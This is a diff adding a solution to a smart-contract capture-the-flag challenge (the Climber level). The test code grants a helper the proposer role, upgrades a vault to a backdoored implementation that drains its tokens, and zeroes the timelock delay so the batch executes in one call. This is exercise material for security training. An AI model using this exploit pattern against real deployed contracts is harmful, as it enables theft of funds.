@@ -7,6 +7,8 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import "./BackdooredVault.sol";
+import "./ExploitHelper.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +87,59 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        address[] memory targets = new address[](4);
+        uint256[] memory values = new uint256[](4);
+        bytes[] memory datas = new bytes[](4);
+        bytes32 salt = keccak256("climb-up");
+
+        address exploitHelper = address(new ExploitHelper());
+
+
+        // Step 1: grant proposer role to our helper contract (because atm it doesn't have the proposer role, it will be used to schedule our operations)
+        datas[0] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            PROPOSER_ROLE,
+            exploitHelper
+        );
+        targets[0] = address(timelock);
+        values[0] = 0;
+
+        // 2 birds with one stone here
+        // Step 2: upgrade the vault to our backdoored implementation and call drain()
+        address backdooredImpl = address(new BackdooredVault());
+        bytes memory drainCall = abi.encodeWithSignature(
+            "drain(address,address)",
+            token,
+            recovery
+        );
+
+        datas[1] = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)",
+            backdooredImpl,
+            drainCall
+        );
+        targets[1] = address(vault);
+        values[1] = 0;
+
+        // Step 3: set the delay for operation execution to 0
+        datas[2] = abi.encodeWithSignature(
+            "updateDelay(uint64)",
+            0
+        );
+        targets[2] = address(timelock);
+        values[2] = 0;
+
+        // Step 4: schedule the same operation so the execute() post-check passes
+        datas[3] = abi.encodeWithSignature(
+            "callBackForSchedule()"
+        );
+        targets[3] = address(exploitHelper);
+        values[3] = 0;
+
+        ExploitHelper(exploitHelper).setInfos(targets, values, datas, payable(timelock),  salt);
+
+        // Execute all in one shot
+        ClimberTimelock(payable(timelock)).execute(targets, values, datas, salt);
     }
 
     /**
